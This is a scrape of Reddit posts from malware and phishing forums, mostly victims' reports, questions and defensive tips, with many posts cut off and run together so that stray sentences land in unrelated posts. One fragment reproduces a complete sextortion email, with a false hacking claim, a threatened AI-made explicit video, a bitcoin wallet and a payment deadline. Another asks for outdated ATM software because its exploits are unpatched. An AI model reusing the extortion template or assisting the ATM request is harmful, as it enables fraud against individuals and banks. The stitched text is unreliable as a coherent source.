Second, what are you using to protect yourself? At the browser level - do you have ublock? Get it. Have you ever messed with your OS Security Settings? Don't mess with them. It's usually fine out-of-the-box. Modern OS security is built in and usually fine. But - you could always do more if you felt it was necessary. I'm not here to sell you on anything - most antivirus software has a 14 day trial and will continue to work afterward. You don't *need* it but the option is there. 
  
Third, what did you actually download? Let's say you see a program with a name like 'driver updater' appear on your Desktop one day and it wants to 'scan your computer and charge you to update your drivers' - that's not malware so much as it is scam-ware. It exists to manufacture conversions (conversions = sales) from those who are generally less knowledgeable in how computers work [elderly, etc]. Your system may or may not let it download because it's not *technically* malware. It's still annoying - but you can remove it via the 'add or remove programs' feature on Windows or drag it to the trash on Mac. Usually takes care of it.   
  
As a general practice, *if you are unsure of a file you downloaded*; go to **VirusTotal** and upload it. You just drag it to the site and it will indicate if it's something you should delete immediately or if it's fine. **This is not a catch-all solution.**
  
If you are actually, genuinely, infected, well - damn. That sucks and I'm sorry. It sucks to hear but there isn't a linear solution for you.   
  
What did you get infected with? If you get hit with ransomware and your files are encrypted - you can try to go to NoMoreRansom[.]org and see if there is a solution there for you. But - the best thing you can do is just reinstall your OS. Seldom will a malware be so sophisticated that it hangs around after that.    
  
Not to say it doesn't happen - but it's not an incredibly common occurrence. Your machine and OS are kind of separate. You can remove the OS from device and it's still a laptop - just with incredibly limited function. You can even install MacOS on a Windows-based laptop - don't actually do that but it emphasizes the idea of separation between the *machine* and the *OS*. Your OS is typically what gets infected, not your machine. 
  
As a backup plan - please, and I am begging you, take half an hour out of the day and dive into how to create a system recovery USB and keep it in a desk drawer. It will delete everything from your old system. It's your prerogative how you want to handle potential data loss. Put some things you want to save before it's wiped out on a USB or something. No linear answer on whether those files are 'dangerous' anymore.   
  
Do *future you* a favor and start developing a habit of creating backups. We all have things that are important to us and we can ensure continuity of those things by *putting them somewhere else* and even *multiple places*. You like downloading funny videos? Upload them to Youtube and set visibility to private. Important photos? Please put them somewhere like Google Photos. School work? Put it on Google Drive. I use a personal, private, FB group to upload hundreds of photos from concerts, life, personal videos, etc. It's private and stored *off my machine* - so there is continuity. It's your prerogative for what you upload and where. If you hate FB, don't use it. Free storage is free storage and I don't care about the quality loss.    
  
Just being conscious about what you are doing online makes it more difficult to even get infected in the first place. If you do get infected - do not panic. Your computer isn't going to catch on fire(x). Take the time to find out what is going on, what it is that you are seeing, and how to tackle it. Approaching things haphazardly is not the best way to protect yourself. 


(x) If your computer *does catch on fire*, please send us a sample of what you were infected with because that would be incredibly cool. Not for you. But...for us. Sorry.",Malware,5027,901,139,1

1686781432.0,Beware new Keylogger malware called PinkwoodNegoga,"I accidentally installed it through SteamUnlocked (totally my fault, will never try to download a cracked game ever again) along with a couple other viruses which were easy to get rid of. Not this one. It was a nightmare. I'm not very tech savvy so I don't know what info to prompt about the virus but, basically:
-The virus appeared as a parent process in task manager called ""Tiny Subaru"". Under it, PinkwoodNegoga was being executed. 
-Trying to stop the process didn't do anything because it automatically started again 
-The executable file was on my Program Files x86 folder. It was impossible to delete because it was always in execution. 
-Using Msconfig and trying to uncheck the box next to ""PinkwoodNegoga.exe"" in the Startup tab was no use because when I clicked ""apply"" it automatically checked again (?????? Like how?) 
-I told chatgpt to write a command to stop the program and delete in one go. Here it is:
$processName = ""PinkwoodNegoga.exe""

# Check if the process is running
if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
    # Terminate the process
    Stop-Process -Name $processName -Force

    # Delete the executable
    Remove-Item -Path $processName -Force
}
else {
    Write-Host ""The process '$processName' is not currently running.""
}
 
It didn't work because it said I didn't have permit (yes, I started cmd as administrator) 
-Then, my friends came out with the idea of telling chatgpt to write a script that would close the program in loop. Here it is:
$exePath = ""C:\path\to\executable.exe""
$intervalInSeconds = 5

while ($true) {
    $process = Get-Process | Where-Object { $_.Path -eq $exePath }

    if ($process) {
        Write-Host ""Closing the executable...""
        Stop-Process -Id $process.Id -Force
        Start-Sleep -Seconds $intervalInSeconds
    }
    else {
        Write-Host ""Executable not found. Exiting the loop.""
        break
    }
}

I made it run in powershell, then tried to delete the .exe, and, unsurprisingly, the ""this thing cannot be deleted because it is executing"" window came up. I spammed the ""Try again"" button until it randomly timed itself right and it finally deleted. 
We stopped the services and everything and we'll, I'll format my computer anyway but at least I don't feel too scared now.

The files in question that I can't find are: CSCWCNG.DLL (Wincor Nixdorf), FAP32.DLL (Wincor Nixdorf), SPISERVICE.EXE (Diebold). It would be also much nicer if I could get the software. The software that I need is ProBase\\C 12.xx or older or old versions of Diebold Agilis 91x. I prefer older versions of these ATM programs since I don't really want to use new versions of the software since exploits and such are patched and I would like to use something that is not being used by banks.

I know that I should probably just buy a literal ATM but I can't really do that for obvious reasons.

I'll start by briefly explaining my situation. The other day, I got a popup on an adult website on my phone I can get really paranoid about potentiel malwares. Though my phone hasn't shown any strange behavior, and even after a VT scan of the popup website that showed only clean results, Kaspersky and Malwarebytes analysis showing my phone is safe, I'm still a bit paranoid that something might be lurking.

Which leads us to my question. I'm certain this paranoia is due to my lack of knowledge about malwares, and it's time I learn more about all of this to better protect myself.

So, what are good ressources I could start with?

**So some questions for professionals already in the field:**

* How much of the Malware you analyze is actually challenging / fun to reverse? Or will it be mostly the same script kiddy stuff with slight variations?
* Additionally, how big a part is reverse engineering and in-depth analysis of your day-to-day job? Or is more time spent aggregating reports from VirusTotal / automated sandboxes / scanners, documentation, meetings?
* How future-proof is the role? Could it be in danger of being replaced by AI? Or could it actually become more valuable due to AI-driven malware?
* Are you satisfied with your current position? Or would you rather have gotten into security engineering, incident response, pentesting, etc. ?
* Any tips for getting into the field? Currently looking to start & finish the Practical Malware Analysis course by TCM to hopefully acquire a foundation, and then start building up a repertoire of analyzed malware.
* Anyone care to comment on the job market for malware analysts in Europe? Is it over-saturated or under-saturated? Any requirements to be on-site or is it usually remote work?

I know that this is supposedly not the place to receive technical help on how to remove malware and stuff from your device, but I rather posted this video to warn about a very cleverly disguised writing tool that is a bit like Grammarly but different and in fact malware.  
The browser extension in question is Elia. You can find it in the chromestore with round about 3000 downloads. The problem is that once you add it to your browser it automatically downloads a very suspicious looking program called ""himepoeelnlpnhph....crx"".   
You can not stop the download, you can not open the folder the download is located  in nor can you find it in downloads nor your task manager.  
This is both a very aggressive and subtle virus.  
Once the stuff gets installed you are redirected to a login page which is already suspicious but then they even want you to put in your login credentials for a google account, a facebook account or your email address!

Howdy beautiful people,

I had a powershell window pop up briefly that tabbed me out of a full screen application, otherwise I may not have noticed it. Never had that happen to me before. Nothing unfamiliar installed recently.

I understand posh enough to see whatever it is, it was trying to download something through a series of TXT DNS record lookups to a list of shady looking domains.

I caught the script running somewhat early and killed it (powershell.exe process using up 1 GB+ memory). I'm not sure that it succeeded in whatever it was trying to do, but the path to the script was nested in a randomly named temp folder under Windows\\system32.

1667303137.0,Cracking group Razor1911 custom installer likely contains malware,"Before reading, please bear in mind that I don't have much knowledge about malware in general.

I believe the custom installer from Return\_to\_Monkey\_Island-Razor1911 contains malware, as well as in other games such as Stray, Metal Hellsinger and probably several others. It seems that they sometimes use the game's original (clean) installer in many releases though. I've compared the installer file content from public and private trackers just to be sure that it's not been altered, and the files also match on [virustotal](https://www.virustotal.com/gui/file/10fadef6b93740e8444a8d90110ee72a1e336519cae2272088a58f829e94be3f/detection).

Like others, I was a bit surprised when Windows real-time protection flagged this installer as malware. Usually it's cracked exe and dll files that get flagged (mostly false positive). All game files in Setup.bin as well as the crack steam\_api64.dll are not flagged as malware on virustotal. So if all theses files are clean, then why is the installer flagged as malware if the installer's only job is to extract some game files? The analysis on [hybrid-analysis](https://www.hybrid-analysis.com/sample/10fadef6b93740e8444a8d90110ee72a1e336519cae2272088a58f829e94be3f) is much more thorough though and [here](https://www.hybrid-analysis.com/sample/10fadef6b93740e8444a8d90110ee72a1e336519cae2272088a58f829e94be3f/635fed6c37f6632ac8713a5b) you can see that it even uses techniques to avoid malware analysis in VM!

What's your take on this? How confident are you that this actually is malware?

1663694913.0,"[Advice Needed] Malicious Browser Extension (Proxy/Botnet) - How can I be sure, and is there any way to get it taken down?","I previously had an extension installed in my browser (Vivaldi, which is Chromium-based) that I only used a few times but left enabled for a while. I have a strong suspicion that this extension is using their end-users' browsers to route/proxy traffic from an external service.

The extension in question is called ModHeader, and is available in the [Chrome Web Store](https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj), [Firefox add-ons site](https://addons.mozilla.org/en-US/firefox/addon/modheader-firefox/), and the [Edge add-ons site](https://microsoftedge.microsoft.com/addons/detail/modheader/opgbiafapkbbnbnjcdomjaghbckfkglc). On [their own website](https://modheader.com), they claim to have 600k+ users.

At the very least, I can prove that this extension was once malicious. (If I had known this, I never would have installed it.) [Krebs posted on it](https://krebsonsecurity.com/2021/03/is-your-browser-extension-a-botnet-backdoor/), and shared this information, with quotes from the developer!  
 

>Then came Infatica, whose code was fairly straightforward by comparison, he said. It restricted the company to routing web requests through his users’ browsers, and did not try to access more sensitive components of the user’s browser experience, such as stored passwords and cookies, or viewing the user’s screen.  
>  
>More importantly, the deal would net him at least $1,500 a month, and possibly quite a bit more.  
>  
>“I gave Infatica a try but within a few days I got [a lot of negative user reviews](https://github.com/bewisse/modheader/issues/64),” he said. “They didn’t like that the extension might be using their browser as a proxy for going to not so good places like porn sites.”  
>  
> Again he relented, and removed the Infatica code. 

Unfortunately, I believe this extension is once again doing something similar. I received a notification from my ISP that I was approaching my monthly data cap (something I could rant about, but I'll hold back on that for now). The usage report from my ISP showed a period of 6 days where my usage hovered around 120GB per day (low of 81GB, high of 174GB). This is far outside of the norm for me (didn't download any large games, etc. during this time).

I was able to trace this back to my desktop, which was surprising, since I assumed something was going on with one of the apps on my home server. I didn't have any detailed logging running at the time, but I pulled up the data usage details built into Windows, and saw over 500GB of data recently used by Vivaldi. I probably haven't downloaded more than 1GB of files through Vivaldi during this time period, and haven't even been watching many videos/streams, etc.

So I suspected it was a browser extension. I disabled a handful I thought could potentially be the culprit and went to bed. In the morning, I saw my data usage was already over 25GB, which was very strange, considering I hadn't even touched my computer that day.

Of the few that were still enabled, ModHeader was one of them. I disabled it and installed an application to keep track of data usage of each Windows application. Between then (9/17) and now (9/19), Vivaldi has used less than 1GB of data (combining both send and receive).

I attempted to investigate a bit by re-enabling the extension, but it seems like the behavior wasn't happening again. I'm curious if it somehow waits until X hours/days to start this behavior, maybe to determine if the browser is open for long enough periods of time, and the connection is fairly stable.

That brings me to my questions - can anyone help me determine if this extension is indeed behaving this way again? The source is on GitHub, and an issue was previously raised (see the link in the Krebs quote), but I'm questioning if that source is truly what is uploaded to the extension/add-on sites. I admittedly don't have the knowledge to analyze the code, though I know downloading the extension and unpacking it would be the best way to start.

If it is confirmed that this extension is indeed performing this malicious activity, what can even be done about it? I saw the sites for the developer are hosted on AWS, could I report it there? (I don't know if the traffic for the proxy is routed through AWS, though.)

**TL;DR - ModHeader browser extension was previously confirmed to be malicious, and I believe it implemented this behavior again. Can we determine if this truly is the case, and if it is, what actions can be taken to try to keep others from being taken advantage of?**",Malware,4559,730,111,1

1654040606.0,Preventing malware with a security analyst approving all new code execution?,"Do you think approving all new code on a computer/network is a good way at preventing malware?

Description:
A security analyst is notified that a user wants to run a new program and approves it (and its libraries) after a quick investigation; such verifying the digital signature (Authenticode) and VirusTotal check.  It's an improvement on application whitelisting used by AppLocker because it's better implemented and has less bypasses.  Instead of AV signatures, everyone (corporate and even home users) would have execution signatures that get updated and pushed out network wide in near real time.

We have full time IDS/EDR analysts, why not an execution analyst (or MSSP) who investigates new programs introduced on the network?  You start by approving your gold image that gets rolled out.  You would have a short list of *new* software that is approved to run on your network or computer; especially if an entire software company gets approved by the execution analyst based on their digital signature.  If code is unsigned, it could be signed by the execution analyst and that signature stored securely.

The General Process:
1. Hook Windows Loader/LoadLibrary
2. End user launches a *new* program on the network and chooses its priority for getting approved. e.g. needs to be approved in 1 minute, 10 minutes, 30 minutes, tomorrow.
3. The program and its details are sent to the software execution analyst.
4. Analyst investigates (Digital Signature, VirusTotal, etc.) the software and allows it to run in some way. e.g. approves the entire publisher to run on your network, or approves it to run on just that computer/OU at a low integrity.
5. The analyst's decision is immediately pushed out to all other computers on the network.

The result of this methodology is that all of the decryption keys released in relation to the ransomware are publicly available.

1642245129.0,Collection of tools for executable packing detection,"For what it's worth... I rewrote a few tools coming from old papers for studying **executable packing** as I couldn't find descent versions for testing and automating them.

- [Bintropy](https://github.com/dhondta/bintropy): Entropy-based packing detection featuring multiple modes (whole binary, per section or segment). Based on the awesome [LIEF](https://github.com/lief-project/LIEF) library, therefore supports ELF, PE, Mach-O.
- [PEiD](https://github.com/dhondta/peid) (Python version): Yet another version of it (I found a few others, but always with an outdated `userdb.txt`), but with a `userdb.txt` merged from various repositories and an additional tool for making new signatures.
- [PyPackerDetect](https://github.com/dhondta/PyPackerDetect) (upgraded fork): Refactored version of the [original](https://github.com/cylance/PyPackerDetect) that seems to be discontinued.

All these are automated/mechanized in a [Docker image](https://github.com/dhondta/docker-packing-box) that allows to do far more than just playing with some packing detectors.

I am not a professional malware analyst. More of a hobbyist who is considering seriously upping his training for a possible career change. Or just to add to my skills.

I have so far been running my malware and other dev/training labs on my 2015 Intel Macbook Pro using VMWare Fusion. I had been eagerly anticipating the release of the new MBP since at 6+ years old my laptop is now showing its age.

However, the new Apple silicon being ARM-based, x86 emulation is a problem. VMWare has said it will not support x86 emulation on its software going forward, so no more old 32-bit OSes on the Mac as far as I know. For various reasons, the ability to spin up those old 32-bit Windows OS VMs is important to me. Analyzing malware on a 32-bit Windows OS would be one of those reasons.

Are there any other Redditors out there who have now run into this problem? If so, what future options are you considering? I'm not an Apple ""fanboy"" by any means, but I do prefer Apple hardware and MacOS. Is anyone aware of any options on how I could continue to run old 32-bit Windows OSes on the Apple silicon going forward? Any ideas are appreciated.",Malware,1229,227,28,1

Hello. The information below is crucial and is being shared for your awareness.
The date 6/6/2023 11:14:23 PM
 marks when I successfully hacked into your device's operating system and secured full control over your account ""ops name
"". My surveillance of you has been ongoing for a considerable period.

I've integrated a software within your system, giving me the ability to control all your devices.
The malware I've positioned gives me complete command over your device's essential tools – your microphone, video camera, keyboard, and display. Your data, photos, and browsing history now reside on my servers, along with access to all your communication platforms – messengers, social networks, emails, synced data, chat histories, and contact lists.
I learned a lot about you!

I pondered on the possibilities that this data presented...
Recently, I've conceptualized an intriguing idea: using AI to develop a split-screen video. One side displays you involved in masturbate  , while the other casts your internet navigations. Videos like this are currently trending!

Boy, I was really taken aback by what came up.

With a single click, I can distribute this video to all your contacts through email, social networks, and instant messengers. Furthermore, I could expose access to all the emails and messaging apps you use.
Additionally, I found a plethora of intriguing materials that I could disseminate online and share with friends.

If you'd rather I didn't carry this out, send 800 $ (US dollar) in my bitcoin wallet.
BTC wallet address:
bc1qa7s0gqxyn3922tr4fxcpv7s0n6q7muy29tvc8f

If you're unfamiliar with how to fund a Bitcoin wallet, you can always use Google for help. It's quite straightforward.
Once the funds have been received, I will immediately remove all unwanted material. Afterward, we can part ways. I assure you that I am committed to deactivating and removing all malware from your devices. You can trust me; I always honor my commitments. This is a fair deal, especially considering the time and effort I've invested in tracking your profile and traffic.

I give exactly two days (48 hours) from the moment of opening this letter for payment.

After this period, if I don't receive the specified amount from you, I'll distribute access to your accounts, visited sites, personal data, and edited videos to everyone, without any warning.

You see, I don't mess up. It's not a good idea to try and pull pranks on me because I have plenty of tricks up my sleeve.

There's no use reporting me because they won't be able to locate me. Formatting the drive or destroying your device won't help because I already possess your data.

It makes no sense to write back to me - I do not write from personal mail and do not look at the answers.




Wishing you luck, and don't let this raise your hackles!

We all have our roles, and it seems you drew the short straw today.




P.S. In the future, I recommend that you follow the safety rules on the Internet and do not visit dubious sites.

The email appears to be from a legitimate domain, and nothing came up in VirusTotal when I checked the link. However, I want to be thorough and ensure that no malicious processes were initiated if an end-user clicked on the link.  

 Here are the details of the situation:

* The sender's email address appears to be from a well-known organization.
* The email contains a link to a website that, at first glance, seems legitimate.
* I couldn't find any reports or indicators of compromise related to this domain or email in my initial research.

My main concern is determining whether clicking on the link could have led to any malicious processes or potential data breaches. I'd appreciate any guidance on how to perform a more in-depth investigation or any tools and techniques that can help me with this specific scenario.

Here are some questions I have:

1. What steps can I take to analyze the link further, even if it appears clean on VirusTotal?
2. Are there any tools or services that specialize in detecting more advanced or zero-day threats?
3. How can I check if any malicious processes were initiated on a user's device after clicking the link?
4. Are there any specific logs or indicators I should be looking for on my network or endpoint devices?

Phishing scams are getting more and more elaborate. Today I received a phone call from a Citibank number. The caller told me someone opened a bank account in my name and were calling me to verify it. Someone has actually tried to open a credit card in my name before so I wasn’t surprised it was happening again. I said no and please close the account. They told me they were canceling the account but two transactions were pending from Zelle and I needed to call Zelle and cancel the charges. They gave me a second number to call. I was panicked at this point and called it. But once I was on the phone again I realized it was a scam when they asked me to add a contact to my Zelle account and add a routing number (presumably to ask me to send money to it to “cancel” the charges). I started to push them a little bit and it became more clear this was a scam operation when I got them off script. It had initially been convincing because Citibank was in the caller ID, they gave me “transaction numbers,” and someone has actually tried to open an account in my name before. I did some Googling and found that it was a real former Citibank number that scammers now spoof.

I just want to share this information to help people avoiding scammers and protecting yourself from internet

Then he mentioned he would like to help me to get more incomes by teaching me crypto through a platform called Fex Global. Which later I figured out, all the money go into this platform will go straight into his pocket. 

I trusted him so much because of his nice words to me and the intentions to help others. He said he has more than 10 years experiences in crypto and has business in London as he is an entrepreneur. 

I was so stupid to trust in him and put my money in there. He offered to send through $26,000 coins to help me trading. When I started to suspicious, I tried to withdraw my money but the platform asked me to pay the fee of more than $2,300 USDT to be able to withdraw funds. And have to pay upfront. 

I asked them why they do not deducted from the balance of my account and they denied to do so. My money locked up there. He pretended to be a victim. When I asked him to pay the fee as he introduced me to this platform and did not tell me anything about this fees. He denied and said that I pay for them and then I can get money back. 

I reported to our cybersecurity in my country in Australia. Obviously, I never get my money back. They all locked up there on Fed Global and the consultant from cybersecurity advised me do not pay any more as they are scammers. 

I know I am so stupid to trust this person. And now I just try to share and warn everyone out there.

Hope no one will fall in him again. He has multiple accounts with different name.

Without getting into too many details, I own chemical distribution company. A few days ago we received this email (see screenshot.)

There's was no body, just the intended recipient disclosure and some other boilerplate along w/ a single attachment of what appears to be some sort of receipt for a purchase order, it's not exactly descriptive. 

The aforementioned attachment *appears* to be a receipt or invoice of some sort relating to a purchase order and also I believe the file is being hosted by Google Drive? I could be wrong on that last part. 

The file claims to have an "".html"" extension. 

I was hoping someone could examine this file in a sandboxed environment or whatever you deem appropriate? It goes without saying I have not done anything with the attachment except forward to email to compartmentalize machine at which point I plan to share the original with whoever's willing to take a look and I will be applying my limited experience as well.

**For context my mother has her emails on her iPhone through the Outlook app.** 

Yesterday she received a call from the email provider (they sent her a text prior telling her they would call in 15-20 mins) who asked her a few more questions about the email, the address it came from, etc.

Hey everybody! Just wanted to say I've enjoyed being part of this community for the last year or so.

No rushing, just consistent innovation.

Blockchain for me has been an interesting journey. Bought some eth on coinbase in 2017 but didn't really dive in til 2020 then deeper in 2021 & beyond while part time caretaking for my mom and pops who had breast cancer & dementia. After my pops passed I started co-producing blockchain events to cope. During that time I got hacked out of $7,500 since I went to uniswap.com the day they upgraded to Uniswap V3 thinking they also upgraded their sub domains to accommodate more urls. My tokens that got hacked would've doubled in value within a week from that time. Posted it on reedit immediately to warn everybody. It was a hard pill to swallow but a good learning lesson and have been avoided all phishing links for the last two years.

Unfortunately when I signed onto opensea tonight I saw that my NT Citizen #3931 had been purchased for O ETH 3 days ago. I've posted the transaction below. They did this to another neotokyo member shortly after and resold at discount deliberately lowering the floor. They have scammed over 100,000 people across some of the biggest nft communities (otherdeeds, byopills, azuki etc). Although I feel bummed I'm also determined & optimistic and know this is only a temporary setback. NT helped me embrace that mindset as did this bear market.

This email I received was forwarded to my legit email and it was just an Airbnb link which Inclicked on and it took me to an Airbnb cottage. Seemed legit. Stupidly thinking it was an actual email i responded saying that I think they emailed the wrong address and I just had a log in attempt on my legit email.

It just took a looong time, for my friends it was approved after 2h max. BUT, there was an authorisation pending. When I realised it might have been a scam I applied through the correct website, paid and received my document.
Now I'm super scared that this third party website has ALL of my sensitive data, even a photo of my passport. I know I'm stupid. The problem is I can't block anything because I'm travelling tomorrow.

1685330822.0,Did I download a malicious program?,"I received an email from an unknown sender. I opened the email to deduce its content and saw that there was an attachment (On iPhones, one page pdf are automatically visible). The attachment was purportedly from Norton and stated that x amount was taken from my account and I should contact the listed number for more information or a refund. I knew that this was a scam, but I accidentally touched the PDF which “opened” and enlarged the pdf. That is, the email was not there but just the pdf. I believe iPhone users would understand what I am trying to convey. 

So, my question is, does that mean I may have downloaded some malicious software onto my iPhone? And should I take any steps to mitigate any damage?",phishing,713,129,13,1

1683739609.0,What happened here?,"I’m trying to figure out what exactly happened with a situation. 

Part of my job is processing requisitions and ordering items for end users. Yesterday I received a requisition for a piece of sports equipment and the end user attached screenshots of a few websites with this item. I googled the item number and the lowest price website came right up same as their screenshot. It was a low dollar amount so I went to purchase it on my company card. At the end of checkout after clicking submit there was a popup asking me to verify the transaction but the dollar amount and website named were different. There were two options for verification: a text to my personal cell number which was indicated by the phone number with all but the last four numbers redacted or an email to my personal email address also with only part of the email visible. Neither my personal cell or personal email were provided to this website during the checkout process. I knew something was wrong so I did not select a verification option and closed out of the browser. I went to my emails both work and personal but had no email. It was late in the day and the card administrator was gone for the day so I decided to have him check the card website in the morning to see if the transaction went through. 

This morning I went back to the website to see if the item was still in the cart and realized the website might be fake. The logo used was for the brand Wilson but this was not the Wilson website. I googled the website and found it might be fake. I had the card admin look and there were no charges on the card. He had me call the card’s fraud line and tell them what happened and they cancelled the card to be safe. 

I guess my question is: how did the website link my company card to my personal email and cell? The only info that was not work related was my name and it’s not that uncommon of a name. The computer used was my work computer that I’ve never used to access my personal email.",phishing,1978,374,21,1

I didn't even believe it yet as my ""ex"" never mentioned someone with his (dummy) name but he told me he kept 2 of the pictures that my ex apparently sent him and sent me one of them. It had my face clearly. I was so sure it wasn't my ex who sent him that and he even confirmed it and now the anonymous guy keeps begging me to send him our ""sex tape"" and even going as far as to ask me to let him open my Snapchat account and he'll watch from there.

Kindly write to me back if you received my previous email message or not.

There are no attachments or links, and it just seems to be a plain text email. I checked my mail (including spam, promotions etc.) and it's all just your average automated emails from stuff like Google and Tumblr. Definitely nothing hand-written.

I woke up this morning to another email, exact same title and body from the same address (first letter of the title uncapitalized), sent at 4:17am.

So... this doesn't seem *obviously* dangerous, it's just text, but the circumstances around it seem extremely suspicious. I might have replied to it if it was my main email, but I literally never use this one, and I figured if it was an actual human being they would at least mention what they're contacting for?

My best guess is that this is an automated thing sent to hundreds or thousands of random email addresses, and then once you reply they try to rope you into giving details or clicking things. But any second opinions before I report it would be appreciated :)",phishing,1514,275,39,1

1680981651.0,Spam report to ISP's abuse address bounces because spam is detected,"I was getting easily 100 phishing emails a day.

* This is an old Hotmail account.
* It appears in at least two lists of accounts from system compromises, posted on the dark web.
* Now it acts as if it were a honeypot for phishing campaigns.

At the start of February, I decided to send emails to ISPs notifying them that they have a customer violating their Terms of Service.

* Save the email as text, retaining its original headers.
* Redact the email, removing personally identifiable information.
* Find the originating IP address and the time it was sent (including time zone).
* Find the ISP for that IP address.
* Find the abuse email address for that ISP.
* Send the ISP the text of the email, the originating IP address and date and time, as well as an explanation of why you claim it is fraudulent (e.g., there's no Coinbase account associated with this email address) and your contact name and phone number.

With the originating IP address, and date and time, the ISP can figure out who the customer is and at least warn them. Three strikes and terminate their account. It is in the ISP's best interests to get spammers and phishers off their network before the IP appears on a blacklist. Getting on a blacklist means other customers won't be able to use their service. Getting off a blacklist is a pain.

This doesn't stop the spammers, who easily find another ISP who will sell them service. It's a shame that there's no coordinated repository of repeat offenders, so that they can be blacklisted. (I remember that someone asked how they get away with this; the absence of coordination explains a lot.)

But first the spam has to be brought to the attention of the ISP.

No, I don't do over 100 reports a day. Maybe 10. Still, I make some effort.

Today I saw over 60 emails in my Hotmail account's ""Junk Email"" folder, before 8:00 AM. 57 of them were bounced emails. Bounced with the explanation:

>Remote server returned '550 5.7.520 Message blocked because it contains content identified as spam. AS(4810)'

Well that's ... what? Of course content would be identified as spam; it is supposed to be spam. That's why I am reporting it. That's why there's an abuse contact mailbox. And the evidence of spam is in the attachment, not the email itself.

I also report all phishing to Microsoft. This doesn't do anything to stop phishing, it only helps them modify their filters. This has the unfortunate side effect of burying the good emails that get sent erroneously to Junk Email under a pile of phishing messages.

The majority of the messages came from [phish@outlooksen.onmicrosoft.com](mailto:phish@outlooksen.onmicrosoft.com). That's not the address I sent them to; I suspect that their abuse contact system filters messages and forwards them to the appropriate team. I know I haven't sent that many to Microsoft in their role as an ISP in the last two months. I'm still trying to figure out what these messages are in relation to. My guess is that a message bounced around so much that it looked like multiple messages, the queue backed up, and this was their way of clearing the queue.

Three messages, though, came from three other ISPs. Abuse contacts bouncing messages because they detect spam. That sounds like a configuration error to me; the abuse mailbox is where you want the examples of spam sent. Someone must have been overzealous with their spam filter configuration.

But three (or, if you include Microsoft, four) ISPs making the same configuration error at the same time? That's not very plausible.

Anyone ever hear of anything like this?",phishing,3577,618,107,1

* New security breaches due to rise of work from anywhere / remote work  
* Employees are being trained but not concerned about potential security breaches 
* Employees are aware of cybersecurity but optimistic bias makes them continue with bad practices (i.e. share a password through internal comms channels, download documents, connect to public wifi networks, using personal laptop,...)  

Existing trainings around cybersecurity aren’t working. Moreover, they are not updated to new employees' potential bad habits (i.e. when traveling, when working remotely,...)

***The solution:***

**A behavioral security trainings catalogue to change employees’ habits and catch the hack before it’s too late**

* **Effective training** on cybersecurity based on a catalogue of pre-defined templates to simulate employee hacks
* **Incentives for employees** to adopt secured practices (rankings and rewards)
* Real-time data for CTOs to track the **company’s real security level** and anticipate threats

**How it would work:**

* **Step 1. Choose and customise pre-defined hacks:** Phishing, CFO fake fraud, simulation of a home wifi hack,... and new hacks related to work from anywhere
* **Step 2. Update employee and providers list and start train-hacking them**If they click on the bait, they’re shown how to prevent it on the future through microlearning pills, ; if they don’t, they are rewarded

Last night I was visiting an adult website, and I ended up clicking a link in the comments. It was to a website called beacons. ai (space added just in case) with a specific subdirectory after the slash. I did a quick Google search and it seemed like the site was safe.

However, when I followed through to the link it did not appear to be what I thought it was (sort of a social media platform like onlyfans). It looked like one of those ads you see for local singles in your area. I exed out after a few seconds and did not enter any information.

I was high and paranoid, so I plugged the address into [Virustotal.com](https://Virustotal.com). It said 1/90 security vendors flagged the URL as malicious for phishing. The rest came back clean. Is this a false positive? The service that flagged it was Xcitium Verdict Cloud.

I also ran it through [urlvoid.com](https://urlvoid.com) which had 1/40 security venders flag it. This time it was SCUMWARE. Lastly, I ran it through [https://safeweb.norton.com/](https://safeweb.norton.com/) which said the link was OK.

I suspect it's fine, but I'm generally pretty cautious about clicking unknown links so this type of situation doesn't come up often. Do you think these flags were false positives or should I be worried? Some additional information that might help you assess my security.

1. I was in Chrome Incognito mode
2. I was on a new MacBook Pro with the latest version of Ventura installed.
3. I turned off my WiFi on the device, but it took me 20-30 minutes after I clicked the link to do so.

1678014416.0,"Elaborate Attack, bank is refusing my dispute, need advice!","Hello!

I was recently the victim of a pretty elaborate phishing attack, I had my bank account cleared out and after a dispute that lasted nearly 3 weeks with my bank, they have refused to refund my money and have closed my case and refuse to open it again. I am devastated, both emotionally and financially and I dont know what to do at this point. Without revealing too much information, here is the scheme that I fell victim to... I also have many screen shots, emails and documented history from my browser as evidence for my case. 

\--------

In February I made a posting to sell a North Face down jacket on eBay Kleinanzeigen (Basically ""craigslist"" for Berlin for those of you who dont know) Within a couple of hours a user offered to buy the jacket and we began our negotiations. After originally offering to send me money through Paypal, the user told me that they were having login issues with Paypal and would rather use eBay’s protected payment service that is provided by the website. I have heard its quite safe and thought it was a great idea but I never used this feature before, and I didn’t know how to initiate it. While I was in the process to try to figure out how to use the feature, I received an email from what I thought was eBay, informing me that the buyer initiating the payment process. I, having never used the payment feature before, naturally thought that the buyer had the ability to make an offer and I was sent an official automated email from eBay to continue with the process. As it turns out, that upon closer inspection of the email much later, that this was a phishing email and the beginning of an elaborate process to gather all of my personal information.

I opened the email, clicked the link, and it took me to a fake (but very official, nearly identical and fully convincing) eBay Kleinanzeigen website to complete the payment process. This website gave a full authentic experience, including an official looking (but fake) N26 Login Portal (N26 is my bank here), where I entered in my account username and my password followed by an official looking payment page where you would enter in your credit card number, expiration date, and CVC code. This is standard procedure on many payment websites and didnt feel at all suspicious or unsafe. I was then walked through my normal 2 Factor Authentication process as expected by receiving notification on my phone asking me to wait for an official N26 SMS with the verification code to complete the authentication process. I entered in the code (standard procedure, guaranteed to be safe) and I was led to a page that told me that the transaction for the agreed price of €325 euros was complete and that I would receive the payment when the buyer confirms that they have received their item. All of these steps were impressively faked and well orchestrated.

A couple hours later I received a warning email from eBay that the user I was dealing with was banned from eBay for suspicious activity and that I should be careful about our conversation and any sensitive information that may have been exchanged. About 30 minutes later, I received a notification that a transaction for about €900.00 was processing and being sent to a business I have never heard of called “COMFY” in Kiev, Ukraine, where I have never been to and have no associations with. The money was sent in UAH with an exchange rate.

The thief tried one more transaction for about €130.00 to finish off the rest of the money in my account, but the transaction failed because of insufficient funds. I then cancelled my card, froze my account, began to take photos and screenshots of my emails, text messages, and card transactions and began began the process of reporting the money stolen with N26. I have also since filed a police report with the Berlin Polizei.

For the last week I have been in continuous exchange with N26 to dispute the transaction and refund the money. N26 assured me yesterday that all of my information was sufficient and the money would be returned in the next 3 to 5 business days, but to my surprise, I received a message today that says they have since changed their minds and will not return the money on the grounds of user negligence.

The following is their exact message:

“Hey \_\_\_\_\_\_\_\_\_,

After analysing the case, we confirm that Mastercard cannot dispute the transaction for the following reasons.

\&nbsp;

